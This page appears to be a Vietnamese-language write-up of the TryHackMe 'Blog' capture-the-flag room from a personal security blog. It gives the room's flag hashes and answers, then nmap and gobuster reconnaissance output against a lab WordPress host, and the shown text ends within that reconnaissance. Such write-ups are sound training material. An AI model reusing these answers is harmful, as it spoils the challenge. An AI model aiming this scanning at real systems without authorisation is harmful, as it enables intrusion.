<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/tryhackme/room/blog/ rel=canonical><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>Blog | 0x5h1n0k0</title><link rel=stylesheet href=../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><link rel=stylesheet href=../../../overrides/assets/stylesheets/main.82a244a8.min.css><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#blog class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Blog </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../cve/ class=md-nav__link> CVE </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_2 type=checkbox id=__nav_1_2> <label class=md-nav__link for=__nav_1_2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../notes/reverse-shell/ class=md-nav__link> Reverse Shell Cheatsheet </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1 type=checkbox id=__nav_2_1> <label class=md-nav__link for=__nav_2_1> Learning Paths <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Learning Paths" data-md-level=2> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> Learning Paths </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1 type=checkbox id=__nav_2_1_1> <label class=md-nav__link for=__nav_2_1_1> Red Teaming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Teaming" data-md-level=3> <label class=md-nav__title for=__nav_2_1_1> <span class="md-nav__icon md-icon"></span> Red Teaming </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_1 type=checkbox id=__nav_2_1_1_1> <label class=md-nav__link for=__nav_2_1_1_1> Init Access <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Init Access" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_1> <span class="md-nav__icon md-icon"></span> Init Access </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../red-team-weaponization/ class=md-nav__link> Weaponization </a> </li> <li class=md-nav__item> <a href=../password-attacks/ class=md-nav__link> Password Attacks </a> </li> <li class=md-nav__item> <a href=../phishing/ class=md-nav__link> Phishing </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_2 type=checkbox id=__nav_2_1_1_2> <label class=md-nav__link for=__nav_2_1_1_2> Post Compromise <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Post Compromise" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_2> <span class="md-nav__icon md-icon"></span> Post Compromise </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../the-lay-of-the-land/ class=md-nav__link> The Lay of the Land </a> </li> <li class=md-nav__item> <a href=../enumeration/ class=md-nav__link> Enumeration </a> </li> <li class=md-nav__item> <a href=../windows-local-persistence/ class=md-nav__link> Windows Local Persistence </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Practice <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Practice data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Practice </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../_index/easy/ class=md-nav__link> Difficulty - Easy </a> </li> <li class=md-nav__item> <a href=../_index/medium/ class=md-nav__link> Difficulty - Medium </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../ class=md-nav__link> Room </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 247CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=247CTF data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 247CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../247ctf/ class=md-nav__link> Web </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> DVWA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DVWA data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> DVWA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../dvwa/ class=md-nav__link> Home </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tags/tags/ class=md-nav__link> Categories </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#pentest-scenario class=md-nav__link> Pentest scenario </a> <nav class=md-nav aria-label="Pentest scenario"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#reconnaissance class=md-nav__link> Reconnaissance </a> </li> <li class=md-nav__item> <a href=#init-access class=md-nav__link> Init Access </a> <nav class=md-nav aria-label="Init Access"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#metasploit class=md-nav__link> Metasploit </a> </li> <li class=md-nav__item> <a href=#python-script class=md-nav__link> Python script </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#privilege-escalation class=md-nav__link> Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#some-problems class=md-nav__link> Some problems </a> <nav class=md-nav aria-label="Some problems"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#139-445 class=md-nav__link> 139 445 </a> </li> <li class=md-nav__item> <a href=#wp-configphp class=md-nav__link> wp-config.php </a> </li> <li class=md-nav__item> <a href=#jtygchfpnfphp class=md-nav__link> JTygChfpNf.php </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#what-we-learned class=md-nav__link> What we learned </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <aside class=mdx-author> </aside> <div class=tags-items style="color: var(--md-default-fg-color--light); padding-bottom: 10px; opacity: 0.9">Tags</div> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/blog/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg> </a> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/blog/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <nav class=md-tags> <a href=../../../tags/tags/#thm-room class=md-tag> THM-Room </a> <a href=../../../tags/tags/#privilege-escalation class=md-tag> Privilege Escalation </a> </nav> <h1 id=blog><strong>Blog</strong><a class=headerlink href=#blog title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 18 minutes</i></p>
 <p>Room at <a href=https://tryhackme.com/room/blog>https://tryhackme.com/room/blog</a></p> <hr> <details class=question> <summary>List of the questions solved</summary> <p>Question: root.txt</p> <blockquote> <p>9a0b2b618bef9bfa7ac28c1353d9f318</p> </blockquote> <p>Question: user.txt</p> <blockquote> <p>c8421899aae571f7af486492b71a8ab7</p> </blockquote> <p>Question: Where was user.txt found?</p> <blockquote> <p>/media/usb</p> </blockquote> <p>Question: What <abbr title="Content Management System (CMS). These web applications are used to manage content on a website. For example, blogs, news sites, e-commerce sites and more!">CMS</abbr> was Billy using?</p> <blockquote> <p>WordPress</p> </blockquote> <p>Question: What version of the above <abbr title="Content Management System (CMS). These web applications are used to manage content on a website. For example, blogs, news sites, e-commerce sites and more!">CMS</abbr> was being used?</p> <blockquote> <p>5.0</p> </blockquote> </details> <h2 id=pentest-scenario><strong>Pentest scenario</strong><a class=headerlink href=#pentest-scenario title="Permanent link">&para;</a></h2> <p>Host: 10.10.184.240</p> <p>Cài đặt ban đầu:</p> <ol> <li>Mở file hosts tại /etc/hosts </li> <li>Thêm dòng <code>10.10.184.240 blog.thm</code> vào cuối file</li> <li>Lưu file</li> <li>Truy cập website thông qua domain blog.thm</li> </ol> <h3 id=reconnaissance><strong>Reconnaissance</strong><a class=headerlink href=#reconnaissance title="Permanent link">&para;</a></h3> <p> <figure><img src=image.png><figcaption>Giao diện website</figcaption> </figure> </p> <p>Đây là một website được triển khai bởi WordPress</p> <p>Tiến hành scan port và url thông qua nmap và gobuster</p> <p>Kết quả từ nmap</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=n>PORT</span>    <span class=n>STATE</span>         <span class=n>SERVICE</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=n>22</span><span class=p>/</span><span class=n>tcp</span>  <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>ssh</span>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>80</span><span class=p>/</span><span class=n>tcp</span>  <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>http</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=n>139</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>netbios-ssn</span>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=n>445</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>microsoft-ds</span>
</code></pre></div> <p>Từ kết quả nmap, ta nhận được 4 cổng kết nối gồm 2 cổng cho smb và 1 cổng ssh, 1 cổng http</p> <p>Một phần kết quả từ gobuster</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=p>/</span><span class=n>rss</span>                  <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>feed</span><span class=p>/]</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=p>/</span><span class=n>login</span>                <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>302</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>blog</span><span class=p>.</span><span class=n>thm</span><span class=p>/</span><span class=n>wp-login</span><span class=p>.</span><span class=n>php</span><span class=p>]</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=p>/</span><span class=n>0</span>                    <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>0</span><span class=p>/]</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=p>/</span><span class=n>feed</span>                 <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>feed</span><span class=p>/]</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a><span class=p>/</span><span class=n>atom</span>                 <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>feed</span><span class=p>/</span><span class=n>atom</span><span class=p>/]</span>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=p>/</span><span class=n>wp-content</span>           <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>315</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>wp-content</span><span class=p>/]</span>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=p>/</span><span class=n>admin</span>                <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>302</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>blog</span><span class=p>.</span><span class=n>thm</span><span class=p>/</span><span class=n>wp-admin</span><span class=p>/]</span>
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=p>/</span><span class=n>rss2</span>                 <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>feed</span><span class=p>/]</span>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=p>/</span><span class=n>wp-includes</span>          <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>316</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>wp-includes</span><span class=p>/]</span>
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a><span class=p>/</span><span class=n>rdf</span>                  <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>feed</span><span class=p>/</span><span class=n>rdf</span><span class=p>/]</span>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a><span class=p>/</span><span class=n>page1</span>                <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/]</span>
